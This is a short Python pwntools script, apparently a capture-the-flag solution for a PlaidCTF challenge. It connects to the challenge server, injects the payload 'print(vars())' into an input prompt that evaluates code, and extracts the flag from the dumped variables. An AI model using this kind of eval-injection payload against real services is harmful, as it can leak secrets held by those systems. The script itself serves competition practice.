from pwn import *
conn = remote('canyouguessme.pwni.ng', 12349)

conn.recvuntil('Input value: ')
conn.sendline('print(vars())')

flag = conn.recv()
start = flag.find("PCTF{")
  
print(flag[start:start+59])
